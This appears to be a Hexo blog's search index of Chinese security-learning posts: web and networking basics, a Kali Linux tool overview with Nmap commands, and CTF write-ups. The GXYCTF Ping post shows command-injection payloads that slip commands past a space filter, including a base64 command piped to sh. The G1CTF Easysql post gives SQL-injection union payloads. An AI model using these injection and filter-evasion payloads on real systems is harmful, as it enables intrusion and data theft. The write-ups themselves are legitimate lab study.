<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>first blog</title>
    <url>/2021/07/03/first-blog/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/07/03/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>Hello World.md</title>
    <url>/2021/07/04/wlb/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>helloworld</category>
      </categories>
      <tags>
        <tag>hello</tag>
        <tag>world</tag>
      </tags>
  </entry>
  <entry>
    <title>Web服务器.md</title>
    <url>/2021/07/04/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="Web服务器通信原理"><a href="#Web服务器通信原理" class="headerlink" title="Web服务器通信原理"></a>Web服务器通信原理</h2><p><img src="https://image.3001.net/images/20210602/1622596790_60b6dcb6aa7b74f369a83.png!small?1622596792210" alt="1622596790_60b6dcb6aa7b74f369a83.png!small?1622596792210"></p>
<span id="more"></span>

<h3 id="一-基础知识介绍"><a href="#一-基础知识介绍" class="headerlink" title="一.基础知识介绍"></a>一.基础知识介绍</h3><p><strong>常见的服务器系统:</strong></p>
<p><img src="https://image.3001.net/images/20210601/1622545831_60b615a7b3ceb4ab1be6b.png!small?1622545830280" alt="1622545831_60b615a7b3ceb4ab1be6b.png!small?1622545830280"></p>
<p><strong>Windows</strong>和<strong>Linux</strong>的区别:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows的路径:C:\Windows\Help&gt;</span><br><span class="line">Linux的路径:/etc/init#</span><br></pre></td></tr></table></figure>

<p>看到看到<strong>盘符</strong>一定是WINDOWS，看到**/**开头一般都是LIUNX( 拿macOS做系统很罕见)</p>
<p><strong>绝对路径,相对路径</strong></p>
<blockquote>
<p>绝对路径:文件在硬盘上真正存在的路径</p>
<p>相对路径:自己相对与目标位置</p>
</blockquote>
<p><strong>CMD命令</strong></p>
<p><strong>渗透测试</strong>常用的Cmd命令:</p>
<blockquote>
<p>dir 显示当前目录</p>
<p>net user查看</p>
<p>cd 跳转XX目录</p>
<p>systeminfo 查看计算机信息</p>
<p>ipconfig 查询自己的ip地址</p>
</blockquote>
<p><strong>网络知识方面</strong></p>
<p><strong>IP</strong>  :内网IP和公网IP;</p>
<p>判断方法:(知道内网地址了,其他的就是公网地址)</p>
<blockquote>
<p><strong>内网地址</strong>取值范围:</p>
<p><strong>A类</strong>：10.0.0.0-10.255.255.255</p>
<p><strong>B类</strong>：172.16.0.0-172.31.255.25</p>
<p><strong>C类</strong>：192.168.0.0-192.168.255.255</p>
</blockquote>
<p><strong>DNS(域名系统)</strong> :</p>
<blockquote>
<p><strong>域名</strong>实际上是为了方便记忆所发明的一个字符型标识</p>
<p><strong>DSN</strong> 将域名转化为ip的一个协议<br><strong>子域名</strong>: 顶级域名、二级域名、三级域名.(几个点就是几级)</p>
</blockquote>
<p><img src="https://image.3001.net/images/20210601/1622551538_60b62bf2d9069ce839602.png!small?1622551537377" alt="1622551538_60b62bf2d9069ce839602.png!small?1622551537377"></p>
<p><strong>端口(port)</strong>  :</p>
<blockquote>
<p>每个端口对应不同的服务</p>
<p><strong>范围</strong>是从0 到65535（2^16-1）</p>
</blockquote>
<p><img src="https://image.3001.net/images/20210601/1622551744_60b62cc0695cf2f185f9b.png!small?1622551742877" alt="1622551744_60b62cc0695cf2f185f9b.png!small?1622551742877"></p>
<p>**HTTP协议(*<em>超文本传输协议*</em>)**:</p>
<blockquote>
<p>是互联网上应用最为广泛的一种网络协议</p>
<p>设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法,访问网站大都是用HTTP协议</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP数据包的简介:</span><br><span class="line">GET / HTTP/1.1                                   #GET是请求方式  HTTP/1.1是协议版本Host: node3.buuoj.cn:25028                       #Host是访问的域名User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36              #告诉HTTP服务器， 客户端使用的操作系统和浏览器的名称和版本</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9    #浏览器端可以接受的媒体类型Accept-Encoding: gzip, deflate                       #浏览器申明自己接收的编码方法Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7   #浏览器申明自己接收的字符集</span><br></pre></td></tr></table></figure>

<h3 id="网页浏览的流程"><a href="#网页浏览的流程" class="headerlink" title="网页浏览的流程"></a>网页浏览的流程</h3><p><strong>访客角度分析</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入协议://域名访问==&gt;DNS服务器找对应IP==&gt;IP收到请求,进行处理返回结果给你==&gt;浏览器将结果处理展示给你看</span><br></pre></td></tr></table></figure>

<blockquote>
<p>一.  用户在浏览器输入协议://域名,</p>
<p>二. 用户浏览器通过系统 → 向DNS服务器查询域名对应的IP地址</p>
<p>三. 用户浏览器向查询到的IP地址(Web服务器)发起HTTP请求</p>
<p>四. 服务器分析用户请求，从中提取数据，处理后返回一个http响应</p>
<p>五. 浏览器收到响应后提取状态、协议编码、正文的有效信息，然后翻译成人类能够直观理解的图形界面并显示</p>
</blockquote>
<h3 id="Web容器"><a href="#Web容器" class="headerlink" title="Web容器:"></a>Web容器:</h3><blockquote>
<p>Web容器可以向发出请求的浏览器提供文档的程序。</p>
<p>WEB容器是一种被动程序：只有其他计算机发出的请求该容器时，容器才会响应。</p>
<p>Web容器的主要功能是存储，处理和传递网页给客户。客户端和服务器之间的通信使用超文本传输协议（HTTP）进行。交付的页面最常见的是HTML文档，除了文本内容之外，还可能包含图像，样式表和脚本。</p>
</blockquote>
<p><img src="https://image.3001.net/images/20210601/1622558048_60b6456062d2dee286c09.png!small?1622558046637" alt="1622558048_60b6456062d2dee286c09.png!small?1622558046637"></p>
<p><img src="https://image.3001.net/images/20210601/1622558051_60b645633babf5c1f4a71.png!small?1622558049521" alt="1622558051_60b645633babf5c1f4a71.png!small?1622558049521"></p>
<p><strong>Web容器</strong>的解析：</p>
<p><img src="https://image.3001.net/images/20210602/1622604346_60b6fa3ad3b34015dc7bc.png!small?1622604349733" alt="1622604346_60b6fa3ad3b34015dc7bc.png!small?1622604349733"></p>
<h2 id="快速自建web安全测试环境"><a href="#快速自建web安全测试环境" class="headerlink" title="快速自建web安全测试环境"></a>快速自建web安全测试环境</h2><h3 id="什么是动态语言"><a href="#什么是动态语言" class="headerlink" title="什么是动态语言"></a>什么是动态语言</h3><p><strong>动态语言</strong>是对<strong>服务器行为的编程</strong>。这被称为<strong>服务器端脚本或服务器脚本</strong>。</p>
<p><img src="https://image.3001.net/images/20210602/1622604068_60b6f9244ce4ef47a9cbf.png!small?1622604068413" alt="1622604068_60b6f9244ce4ef47a9cbf.png!small?1622604068413"></p>
<p><strong>常见的服务器脚本</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Asp,Aspx(windows);</span><br><span class="line">PHP(全平台);</span><br><span class="line">JSP(全平台)（java）</span><br><span class="line">python(全平台)</span><br></pre></td></tr></table></figure>

<p>动态语言<strong>能做什么</strong>：</p>
<blockquote>
<p>1.动态地向 web 页面<strong>编辑、改变或添加</strong>任何的内容</p>
<p>2.对由 HTML 表单提交的用户请求或数据<strong>进行响应</strong> </p>
<p>3.<strong>访问</strong>数据或数据库，并向浏览器返回结果</p>
<p>4.为<strong>不同的用户</strong>定制页面</p>
<p>5.提高<strong>网页安全性</strong>，使您的网页代码不会通过浏览器被查看到</p>
</blockquote>
<h3 id="服务器环境的快速搭建"><a href="#服务器环境的快速搭建" class="headerlink" title="服务器环境的快速搭建"></a>服务器环境的快速搭建</h3><p><strong>常见服务器</strong>快速搭建的软件:</p>
<blockquote>
<p><strong>JSP(Tomcat)</strong> </p>
<p><strong>PHP(PHPStudy)</strong> <strong>windows</strong> </p>
<p><strong>PHP(lnmp) linux</strong>  </p>
<p><strong>宝塔、Lamp</strong> </p>
</blockquote>
<h3 id="PhPstudy功能介绍"><a href="#PhPstudy功能介绍" class="headerlink" title="PhPstudy功能介绍"></a>PhPstudy功能介绍</h3><p>PHPStudy使用说明教程:   <a href="https://www.php.cn/phpstudy-377909.html">https://www.php.cn/phpstudy-377909.html</a></p>
<h3 id="快速搭建一个网站-通过CMS"><a href="#快速搭建一个网站-通过CMS" class="headerlink" title="快速搭建一个网站(通过CMS)"></a>快速搭建一个网站(通过CMS)</h3><blockquote>
<p><strong>CMS</strong>意为”内容管理系统”,实际上就是一个<strong>快速建站的模板</strong>，常见的CMS有织梦、Dz论坛等</p>
<p><strong>获取CMS源码方式：</strong>可以去<strong>官方下载</strong>也可以去一些<strong>源码交流论坛</strong>还可以去<strong>github</strong>下载</p>
</blockquote>
<p><strong>织梦CMS</strong>：<a href="http://www.dedecms.com/products/dedecms/downloads/">http://www.dedecms.com/products/dedecms/downloads/ </a></p>
<blockquote>
<p>CMS源码解压后放入<strong>WWW目录</strong>，然后直接去访问<strong>upload文件夹</strong>，然后可以直接进入<strong>安装引导</strong></p>
<p>安装过程仅仅只需要你输入<strong>数据库密码</strong>就可以安装成功了</p>
<p><strong>install 文件夹</strong> </p>
</blockquote>
<p><img src="https://image.3001.net/images/20210602/1622610443_60b7120b36e4506e29553.png!small?1622610443324" alt="1622610443_60b7120b36e4506e29553.png!small?1622610443324"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>渗透测试学习</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试kali Linux常用工具</title>
    <url>/2021/07/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95kali-Linux%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p><img src="https://image.3001.net/images/20210521/1621571329_60a73701d9767251e4748.png!small" alt="img"></p>
<p><strong>kali Linux工具帮你评估 Web 服务器的安全性，并帮助你执行黑客渗透测试。</strong></p>
<h3 id="注意：这里不是所提及的所有工具都是开源的。"><a href="#注意：这里不是所提及的所有工具都是开源的。" class="headerlink" title="注意：这里不是所提及的所有工具都是开源的。"></a><strong>注意：这里不是所提及的所有工具都是开源的。</strong></h3><span id="more"></span>

<h2 id="1-Nmap"><a href="#1-Nmap" class="headerlink" title="1. Nmap"></a>1. Nmap</h2><p><img src="https://image.3001.net/images/20210520/1621507756_60a63eac521c0abeb99bc.png!small?1621507755558" alt="1621507756_60a63eac521c0abeb99bc.png!small?1621507755558"></p>
<p><strong>Nmap</strong>（<strong>网络映射器</strong>）是一款用于<strong>网络发现</strong>和<strong>安全审计</strong>的<strong>网络安全</strong>工具.</p>
<p><a href="https://zh.wikipedia.org/wiki/Nmap#Nmap_%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD">核心功能</a><strong><a href="https://zh.wikipedia.org/wiki/Nmap#Nmap_%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD">:  主机发现,端口扫描,版本侦测,操作系统侦测,防火墙/IDS规避和哄骗</a></strong></p>
<p>Nmap 基本语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap [ &lt;扫描类型&gt; ...] [ &lt;选项&gt; ] &#123; &lt;扫描目标说明&gt; &#125;</span><br></pre></td></tr></table></figure>

<p><strong>全面进攻性</strong>扫描（包括各种主机发现、端口扫描、版本扫描、OS扫描及默认脚本扫描）:</p>
<p>nmap -A -v target_ip</p>
<p><strong>ping</strong>扫描:    nmap -sn -v target_ip</p>
<p><strong>快速端口</strong>扫描:nmap -F -v target_ip</p>
<p><strong>版本</strong>扫描:    nmap -sV -v target_ip</p>
<p><strong>操作系统</strong>扫描:nmap -O -v target_ip</p>
<h2 id="2-Wireshark"><a href="#2-Wireshark" class="headerlink" title="2. Wireshark"></a>2. Wireshark</h2><p><img src="https://image.3001.net/images/20210520/1621519865_60a66df98359498712be9.png!small?1621519864772" alt="1621519865_60a66df98359498712be9.png!small?1621519864772"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><strong>Wireshark的</strong>是一个<a href="https://en.wikipedia.org/wiki/Free_software">自由</a>和<a href="https://en.wikipedia.org/wiki/Open-source_software">开源</a><a href="https://en.wikipedia.org/wiki/Packet_analyzer">数据包分析器,是 Kali Linux 上最受欢迎的网络分析仪。</a></p>
<p><strong>Wireshark</strong>使用WinPCAP作为接口，直接与<strong>网卡</strong>进行<strong>数据报文交换。</strong></p>
<h2 id="3-Metasploit-Framework"><a href="#3-Metasploit-Framework" class="headerlink" title="3. Metasploit Framework"></a>3. Metasploit Framework</h2><p><img src="https://image.3001.net/images/20210520/1621522244_60a67744d96353fc7a85a.png!small?1621522243943" alt="1621522244_60a67744d96353fc7a85a.png!small?1621522243943"></p>
<p><strong>Metasploit Framework</strong>是一个旨在提供<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3">安全漏洞信息</a>计算机安全项目，可以协助安全工程师进行<a href="https://zh.wikipedia.org/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>（penetration testing）及<a href="https://zh.wikipedia.org/wiki/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F">入侵检测系统</a>签名开发。</p>
<p><strong>Metasploit Framework</strong>最为知名的子项目是<a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%94%BE%E6%BA%90%E4%BB%A3%E7%A0%81">开源</a>的Metasploit框架，一套针对远程主机进行开发和执行“<a href="https://zh.wikipedia.org/wiki/Exploit">exploit</a>代码”的工具</p>
<p>使用<strong>Metasploit框架</strong>的基本步骤包括：</p>
<p>选择并配置一个攻击代码(exploit, 利用<a href="https://zh.wikipedia.org/wiki/%E6%BC%8F%E6%B4%9E">漏洞</a>来进入目标系统的代码）；</p>
<p>检查目标系统是否会被此代码影响；</p>
<p>选择并配置一个<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD">有效负载</a>(payload, 在成功进入后在目标系统上执行的代码）；</p>
<p>选择编码方式，使<a href="https://zh.wikipedia.org/wiki/%E5%85%A5%E4%BE%B5%E9%A2%84%E9%98%B2%E7%B3%BB%E7%BB%9F">入侵预防系统</a>，忽略已被编码的有效负载；</p>
<p>执行攻击代码。</p>
<h2 id="4-Hydra"><a href="#4-Hydra" class="headerlink" title="4.Hydra"></a>4.Hydra</h2><p><img src="https://image.3001.net/images/20210521/1621557142_60a6ff96c05efacb613fa.png!small?1621557141539" alt="1621557142_60a6ff96c05efacb613fa.png!small?1621557141539"></p>
<p><strong>Hydra</strong>是<a href="https://en.wikipedia.org/wiki/Parallel_computing">并行化的</a>网络<a href="https://en.wikipedia.org/wiki/Password_cracking">登录破解程序，</a>内置于各种操作系统中。</p>
<p><strong>Hydra</strong>通过使用<a href="https://en.wikipedia.org/wiki/Brute-force_attacks">暴力攻击</a>，猜测正确的用户名和<a href="https://en.wikipedia.org/wiki/Password">密码</a>。</p>
<p><strong>kali</strong>下是默认安装的，几乎支持<strong>所有协议</strong>的在线破解</p>
<h2 id="5-Aircrack-ng"><a href="#5-Aircrack-ng" class="headerlink" title="5.Aircrack-ng"></a>5.Aircrack-ng</h2><p><img src="https://image.3001.net/images/20210521/1621558601_60a705494e04e16c4a9ea.png!small?1621558601612" alt="1621558601_60a705494e04e16c4a9ea.png!small?1621558601612"></p>
<p><strong>Aircrack-ng</strong>是一个与<a href="https://zh.wikipedia.org/wiki/802.11">802.11</a>标准的无线网络分析有关的安全软件，主要功能有：网络侦测，<a href="https://zh.wikipedia.org/wiki/%E5%97%85%E6%8E%A2">数据包嗅探</a>，<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A%A0%E5%AF%86">WEP</a>和<a href="https://zh.wikipedia.org/wiki/WPA">WPA</a>/<a href="https://zh.wikipedia.org/w/index.php?title=WPA2-PSK&action=edit&redlink=1">WPA2-PSK</a>破解。</p>
<p><strong>Aircrack-ng可以</strong>用于<strong>监视</strong>，<strong>收集</strong>有关WiFi的信息SSID（服务集标识符）IP和MAC地址以及WiFi的破解密码</p>
<h2 id="6-Nessus"><a href="#6-Nessus" class="headerlink" title="6.Nessus"></a>6.Nessus</h2><p><img src="https://image.3001.net/images/20210521/1621559138_60a70762f130c4c142c9d.png!small?1621559139366" alt="1621559138_60a70762f130c4c142c9d.png!small?1621559139366"></p>
<p><strong>Nessus</strong>为一款<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F">系统</a>弱点<a href="https://zh.wikipedia.org/wiki/%E6%89%AB%E6%8F%8F">扫描</a>与分析软件。能够协助<strong>检测和修复</strong>各种操作系统、应用程序、乃至设备上的漏洞、恶意软件、配置错误、及补丁的缺失。</p>
<p>但是，它不再是免费的工具了，免费的功能受限制。</p>
<h2 id="7-WafW00f"><a href="#7-WafW00f" class="headerlink" title="7.WafW00f"></a>7.WafW00f</h2><p><img src="https://image.3001.net/images/20210521/1621566853_60a72585ab7ca2a6138c3.png!small?1621566854391" alt="1621566853_60a72585ab7ca2a6138c3.png!small?1621566854391"></p>
<p>**Wafw00f –**防火墙检测工具，</p>
<p><strong>Wafw00f</strong> 使用一组HTTP请求和方法查询Web服务器,分析来自它们的响应并检测防火墙</p>
<h2 id="8-Burp-Suite"><a href="#8-Burp-Suite" class="headerlink" title="8. Burp Suite"></a>8. Burp Suite</h2><p><img src="https://image.3001.net/images/20210520/1621526092_60a6864c6294e11a17405.png!small?1621526091423" alt="1621526092_60a6864c6294e11a17405.png!small?1621526091423"></p>
<p><strong>Burp Suite</strong>是一个用于测试网络应用程序安全性的图形化工具，出色的网络安全分析工具。</p>
<p><strong>主要模块</strong>介绍:</p>
<p><strong>HTTP代理</strong>— 它作为一个 Web 代理服务器运行，并且位于浏览器和目标 Web 服务器之间。这允许拦截、检查和修改在两个方向上通过的原始流量。</p>
<p><strong>Scanner</strong>(扫描器)— 一个 Web 应用程序安全扫描器，用于执行 Web 应用程序的自动漏洞扫描。</p>
<p><strong>Intruder</strong>(入侵)— 此工具可以对 Web 应用程序执行自动攻击。该工具提供了一种可配置的<a href="https://zh.wikipedia.org/wiki/%E7%AE%97%E6%B3%95">算法</a>，可以生成恶意 HTTP 请求。Intruder 工具可以测试和检测 <a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A">SQL 注入</a>、<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC">跨站脚本</a>、参数篡改和易受蛮力攻击的漏洞。</p>
<p>**Spider(蜘蛛)**— 一个自动抓取 Web 应用程序的工具。</p>
<p>**Repeater(中继器)**— 一个可以用来手动测试应用程序的简单工具。它可以用于修改对服务器的请求，重新发送它们并观察结果。</p>
<p><strong>Decoder</strong>(解码器)— 一种将已编码的数据转换为其规范形式，或将原始数据转换为各种编码和散列形式的工具。它能够利用启发式技术智能识别多种编码格式。</p>
<p><strong>Comparer</strong>(比较)— 在任意两个数据项之间执行比较（一个可视化的“差异”）的工具。</p>
<p><strong>Extender</strong>(扩展)— 允许安全测试人员加载 Burp 扩展，使用安全测试人员自己的或第三方代码扩展 Burp 的功能</p>
<p><strong>Sequencer</strong>(会话)— 一种分析数据项样本随机性的工具。它可以用于测试应用程序的会话令牌或其他重要的数据项，如反 CSRF 令牌、密码重置令牌等。</p>
<h2 id="9-Maltego"><a href="#9-Maltego" class="headerlink" title="9.Maltego"></a>9.Maltego</h2><p><img src="https://image.3001.net/images/20210521/1621568089_60a72a59da57f1f4697a9.png!small?1621568090170" alt="1621568089_60a72a59da57f1f4697a9.png!small?1621568090170"></p>
<p><strong>Maltego</strong>–是一个<strong>开源情报</strong>（OSINT）和<strong>图形链接分析</strong>工具,用于<strong>收集和连接</strong>用于调查任务的信息。</p>
<p><strong>Maltego  以简单,智能,功能强大受安全人员喜爱。</strong></p>
<h2 id="10-W3AF"><a href="#10-W3AF" class="headerlink" title="10.W3AF"></a>10.W3AF</h2><p><img src="https://image.3001.net/images/20210521/1621570653_60a7345de36022a563727.png!small?1621570654103" alt="1621570653_60a7345de36022a563727.png!small?1621570654103"></p>
<p><strong>W3AF</strong>是一个<a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%BA%90">开源</a>的Web应用程序安全扫描器。该项目为<a href="https://zh.wikipedia.org/wiki/Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">Web应用程序</a>提供了一个漏洞扫描器和漏洞利用工具。它提供了有关<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3">安全性漏洞</a>的信息，以便在<a href="https://zh.wikipedia.org/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>项目中使用</p>
<p><strong>W3AF</strong>能用Web应用程序攻击和审核框架的Arconym，来查找网站中的缺陷</p>
<h2 id="11-Wpscan"><a href="#11-Wpscan" class="headerlink" title="11.Wpscan"></a>11.Wpscan</h2><p><img src="https://image.3001.net/images/20210521/1621571845_60a7390565d22fd5ad546.png!small?1621571846484" alt="1621571845_60a7390565d22fd5ad546.png!small?1621571846484"></p>
<p><strong>Wpscan</strong>是Kali Linux 自带的一款漏洞扫描工具，它采用Ruby 编写，能够扫描WordPress 网站中的多种安全漏洞，它可以为所有Web开发人员扫描 WordPress漏洞并在他们开发前找到并解决问题。</p>
<p>WordPress（WP，WordPress.org）是一个<a href="https://en.wikipedia.org/wiki/Free_and_open-source_software">免费的开源</a><a href="https://en.wikipedia.org/wiki/Content_management_system">内容管理系统</a>（CMS）</p>
<h2 id="12-sqlmap"><a href="#12-sqlmap" class="headerlink" title="12.sqlmap"></a>12.sqlmap</h2><p><img src="https://image.3001.net/images/20210521/1621573031_60a73da7e023739dc8878.png!small?1621573033546" alt="1621573031_60a73da7e023739dc8878.png!small?1621573033546"></p>
<p><strong>sqlmap</strong>是一个开源的渗透测试工具，可以用来进行自动化检测，能自动化利用 SQL 注入漏洞的过程，帮助你接管数据库服务器</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Kali linux</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 PingPingping</title>
    <url>/2021/07/05/GXYCTF/</url>
    <content><![CDATA[<h2 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h2><p>进入题目<img src="https://image.3001.net/images/20210519/1621431470_60a514ae22660b55f09d7.png!small" alt="img"></p>
<span id="more"></span>

<p>肯定先Ping一下本地IP:127.0.0.1<br><img src="https://image.3001.net/images/20210519/1621431470_60a514aec2d656d3179be.png!small" alt="img">能连接上</p>
<p>然后用<strong>ls</strong>关键字列出当前目录的内容</p>
<p><img src="https://image.3001.net/images/20210519/1621431914_60a5166ab09adfcf9393c.png!small?1621431914356" alt="1621431914_60a5166ab09adfcf9393c.png!small?1621431914356">接着我们肯定想查看flag.php里面的值<br>用<strong>cat</strong>命令查看文件内容,<br>还有其他查看命令主要是tac,head,more,tail,less<br><img src="https://image.3001.net/images/20210519/1621431472_60a514b0e3834c943a421.png!small" alt="img">显示空格被过滤了；<br>一般空格过滤绕过的方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;cat,flag&#125;;   $&#123;IFS$;   $IFS$9;   &lt;;   &lt;&gt;;</span><br></pre></td></tr></table></figure>

<p>经过测试用空格用**$IFS$9<strong>绕过;<br>然后变量</strong>拼接,倒序**得到payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=ag;b=fl;cat$IFS$1$b$a.php</span><br><span class="line">也可以?ip=127.0.0.1;a=lag;cat$IFS$9f$a.php</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210519/1621432029_60a516ddb83e9343a6f5d.png!small?1621432029374" alt="1621432029_60a516ddb83e9343a6f5d.png!small?1621432029374"></p>
<h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h3><p>内联执行绕过<br>将<strong>反引号内</strong>命令的输出作为输入执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=|cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>

<h3 id="解法3"><a href="#解法3" class="headerlink" title="解法3:"></a>解法3:</h3><p>虽然过滤了bash，但没过滤sh,可以使用下面的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</span><br></pre></td></tr></table></figure>

<p>推荐写的<em><strong>很好</strong></em>的关于此类题目的文章</p>
<p><a href="https://www.codenong.com/cs105422347/">https://www.codenong.com/cs105422347/</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>GXYCTF 2019</tag>
      </tags>
  </entry>
  <entry>
    <title>G1CTF2021 Easysql</title>
    <url>/2021/07/05/G1CTF2021-Easysql/</url>
    <content><![CDATA[<p>映入眼帘的是<img src="https://image.3001.net/images/20210524/1621860284_60ab9fbc6d7d65a5de710.png!small" alt="1621860284_60ab9fbc6d7d65a5de710.png!small"></p>
<p>告诉了我们flag在 <strong>flag表里的flag字段</strong></p>
<p>在框里<strong>输入数字</strong>有<strong>回显</strong></p>
<span id="more"></span>

<p><img src="https://image.3001.net/images/20210524/1621860665_60aba139a844128cfc8a3.png!small" alt="1621860665_60aba139a844128cfc8a3.png!small"></p>
<p>说明用户输入的数据被当做<strong>sql代码</strong>执行了</p>
<p>说明这里存在<strong>sql注入</strong></p>
<p>页面显示 hacker!</p>
<p>说明<strong>空格</strong>被过滤了</p>
<p>sql注入绕过<strong><strong>空格</strong></strong>的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注释符/**/，%a0      </span><br></pre></td></tr></table></figure>

<p><strong>sql注入绕过技巧推荐:</strong> <a href="https://www.cnblogs.com/Vinson404/p/7253255.html">https://www.cnblogs.com/Vinson404/p/7253255.html</a></p>
<p>判断当前页面的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/order/**/by/**/1,2,3,4.....</span><br></pre></td></tr></table></figure>

<p>经测试<strong>字段数为3</strong></p>
<p>然后<strong>联合查询</strong>注入得flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,2,flag/**/from/**/flag#</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210525/1621939518_60acd53ee79bfe5706343.png!small" alt="1621939518_60acd53ee79bfe5706343.png!small"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>G1CTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>G1CTF2021 Babysql</title>
    <url>/2021/07/05/G1CTF2021-Babysql/</url>
    <content><![CDATA[<p>babysql是  <strong>easysql</strong>的加强版</p>
<p><a href="articles/network/274461.html">https://www.freebuf.com/articles/network/274461.html</a></p>
<p>尝试输入一下东西只回显 <strong>search success和hacker!</strong></p>
<p>典型的布尔盲注：</p>
<span id="more"></span>

<p><img src="https://image.3001.net/images/20210529/1622273246_60b1ecde96a511f946fd2.png!small" alt="1622273246_60b1ecde96a511f946fd2.png!small"></p>
